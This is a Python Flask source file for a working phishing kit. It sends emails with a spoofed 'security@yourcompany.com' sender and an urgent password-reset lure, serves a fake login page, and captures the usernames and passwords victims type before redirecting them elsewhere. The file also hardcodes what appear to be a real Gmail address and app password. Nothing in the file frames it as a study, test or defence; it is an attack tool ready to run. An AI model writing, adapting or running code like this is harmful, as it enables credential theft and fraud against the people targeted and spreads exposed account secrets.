from flask import Flask, render_template, request, redirect
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

app = Flask(__name__)
captured_credentials = []

# Email configuration
SMTP_SERVER = 'smtp.gmail.com'
SMTP_PORT = 587
SENDER_EMAIL = 'hyrunizza.19@gmail.com'  # Your Gmail
SENDER_PASSWORD = 'kgge pjpp sryk pwwq'  # App Password
SPOOFED_FROM = 'security@yourcompany.com'  # What recipient will see

def send_phishing_email(target_email, fake_link):
    msg = MIMEMultipart()
    msg['From'] = SPOOFED_FROM
    msg['To'] = target_email
    msg['Subject'] = "URGENT: Password Reset Required!"
    
    body = f"""
    <html>
      <body>
        <p>Dear User,</p>
        <p>We detected unusual activity on your account. Immediate password reset is required.</p>
        <p><a href="{fake_link}">Click here to reset your password</a></p>
        <p>If you did not request this, please ignore this email.</p>
      </body>
    </html>
    """
    msg.attach(MIMEText(body, 'html'))
    
    try:
        server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
        server.starttls()
        server.login(SENDER_EMAIL, SENDER_PASSWORD)
        server.sendmail(SENDER_EMAIL, target_email, msg.as_string())
        return True, f"Email sent to {target_email}"
    except Exception as e:
        return False, str(e)
    finally:
        server.quit()

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/send_email', methods=['POST'])
def send_email():
    target_email = request.form['target_email']
    fake_link = request.form.get('fake_link', 'http://localhost:5000/fake_login')
    
    success, message = send_phishing_email(target_email, fake_link)
    
    if success:
        return render_template('index.html', success=message)
    else:
        return render_template('index.html', error=message)

@app.route('/fake_login')
def fake_login():
    return render_template('fake_login.html')

@app.route('/capture_creds', methods=['POST'])
def capture_creds():
    username = request.form['username']
    password = request.form['password']
    captured_credentials.append({'username': username, 'password': password})
    return redirect("https://example.com")  # Redirect to legit site

if __name__ == '__main__':
    app.run(debug=True)
